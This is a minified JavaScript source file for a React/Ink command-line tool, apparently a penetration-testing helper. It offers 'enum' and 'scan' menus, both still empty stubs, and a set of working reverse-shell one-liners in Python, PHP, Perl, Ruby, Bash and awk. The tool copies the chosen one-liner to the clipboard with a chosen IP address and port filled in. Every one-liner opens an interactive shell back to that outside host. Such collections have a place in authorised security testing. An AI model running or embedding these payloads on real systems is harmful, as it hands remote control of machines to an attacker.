"use strict";var _interopRequireWildcard=require("@babel/runtime/helpers/interopRequireWildcard"),_interopRequireDefault=require("@babel/runtime/helpers/interopRequireDefault");require("core-js/modules/es.array.iterator"),Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _is2=_interopRequireDefault(require("ramda/src/is")),_asyncToGenerator2=_interopRequireDefault(require("@babel/runtime/helpers/asyncToGenerator")),_react=_interopRequireWildcard(require("react")),_propTypes=_interopRequireDefault(require("prop-types")),_clipboardy=_interopRequireDefault(require("clipboardy")),_chalk=require("chalk"),_ink=require("ink"),_tomoCli=require("tomo-cli");const descriptions={enum:"Enumerate stuff",scan:"Scan stuff","reverse shell (php)":`Copy one-line reverse shell written in ${_chalk.bold.magenta("PHP")}`,"reverse shell (python)":`Copy one-line reverse shell written in ${_chalk.bold.yellow("Python")}`,"reverse shell (perl)":`Copy one-line reverse shell written in ${_chalk.bold.blue("Perl")}`,"reverse shell (ruby)":`Copy one-line reverse shell written in ${_chalk.bold.red("Ruby")}`,"reverse shell (bash)":`Copy one-line reverse shell written in ${_chalk.bold.bgBlack.white(" Bash ")}`,"reverse shell (awk)":`Copy one-line reverse shell written in ${_chalk.bold.bgBlack.white(" awk ")}`},commands={copy:{"reverse shell (python)":[{text:"Copy Python reverse shell to clipboard",task:function(){var a=(0,_asyncToGenerator2.default)(function*({ip:a,port:b}){yield _clipboardy.default.write(`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${a}",${b}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`)});return function task(){return a.apply(this,arguments)}}(),condition:()=>!0}],"reverse shell (php)":[{text:"Copy PHP reverse shell to clipboard",task:function(){var a=(0,_asyncToGenerator2.default)(function*({ip:a,port:b}){yield _clipboardy.default.write(`php -r '$sock=fsockopen("${a}",${b});exec("/bin/sh -i <&3 >&3 2>&3");'`)});return function task(){return a.apply(this,arguments)}}(),condition:()=>!0}],"reverse shell (perl)":[{text:"Copy Perl reverse shell to clipboard",task:function(){var a=(0,_asyncToGenerator2.default)(function*({ip:a,port:b}){yield _clipboardy.default.write(`perl -e 'use Socket;$i="${a}";$p=${b};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`)});return function task(){return a.apply(this,arguments)}}(),condition:()=>!0}],"reverse shell (ruby)":[{text:"Copy Ruby reverse shell to clipboard",task:function(){var a=(0,_asyncToGenerator2.default)(function*({ip:a,port:b}){yield _clipboardy.default.write(`ruby -rsocket -e'f=TCPSocket.open("${a}",${b}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`)});return function task(){return a.apply(this,arguments)}}(),condition:()=>!0}],"reverse shell (bash)":[{text:"Copy Bash reverse shell to clipboard",task:function(){var a=(0,_asyncToGenerator2.default)(function*({ip:a,port:b}){yield _clipboardy.default.write(`bash -i >& /dev/tcp/${a}/${b} 0>&1`)});return function task(){return a.apply(this,arguments)}}(),condition:()=>!0}],"reverse shell (awk)":[{text:"Copy awk reverse shell to clipboard",task:function(){var a=(0,_asyncToGenerator2.default)(function*({ip:a,port:b}){yield _clipboardy.default.write(`awk 'BEGIN {s = "/inet/tcp/0/${a}/${b}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`)});return function task(){return a.apply(this,arguments)}}(),condition:()=>!0}]},scan:{ports:[{text:"Test",task:function(){var a=(0,_asyncToGenerator2.default)(function*(){});return function task(){return a.apply(this,arguments)}}(),condition:()=>!0}]},enum:{web:[],snmp:[],smb:[],smtp:[]}};/**
 * Main tomo UI component
 * @param {Object} props Component props
 * @return {ReactComponent} Main tomo UI component
 */class UI extends _react.Component{constructor(a){super(a);const{flags:b,input:c}=a,{ignoreWarnings:d}=b,[e,...f]=c,g=(0,_is2.default)(String)(e),h=0<f.length,{intendedCommand:i,intendedTerms:j}=g?(0,_tomoCli.getIntendedInput)(commands,e,f):{},k=(e!==i||h&&j.map((a,b)=>a!==f[b]).some(Boolean))&&!d;this.state={hasTerms:h,hasCommand:g,showWarning:k,intendedTerms:j,intendedCommand:i},this.updateWarning=this.updateWarning.bind(this),this.updateTerms=this.updateTerms.bind(this)}render(){const{done:a,flags:b}=this.props,{hasCommand:c,hasTerms:d,intendedCommand:e,intendedTerms:f,showWarning:g}=this.state;return _react.default.createElement(_tomoCli.ErrorBoundary,null,g?_react.default.createElement(_tomoCli.Warning,{callback:this.updateWarning},_react.default.createElement(_ink.Text,null,"Did you mean ",_react.default.createElement(_ink.Color,{bold:!0,green:!0},e," ",f.join(" ")),"?")):c&&d?_react.default.createElement(_tomoCli.TaskList,{commands:commands,command:e,terms:f,options:b,done:a}):c?_react.default.createElement(_tomoCli.SubCommandSelect,{command:e,descriptions:descriptions,items:Object.keys(commands[e]).map(a=>({label:a,value:a})),onSelect:this.updateTerms}):_react.default.createElement(_tomoCli.UnderConstruction,null))}/**
     * Callback function for warning component
     * @param {string} data Character data from stdin
     * @return {undefined} Returns nothing
     */updateWarning(a){"\r"==a+""?this.setState({showWarning:!1}):process.exit(0)}/**
     * @param {Object} args Function options
     * @param {string} args.value Intended term
     * @return {undefined} Returns nothing
     */updateTerms({value:a}){this.setState({hasTerms:!0,intendedTerms:[a]})}}exports.default=UI,UI.propTypes={input:_propTypes.default.array,flags:_propTypes.default.object,done:_propTypes.default.func,stdin:_propTypes.default.string},UI.defaultProps={input:[],flags:{}};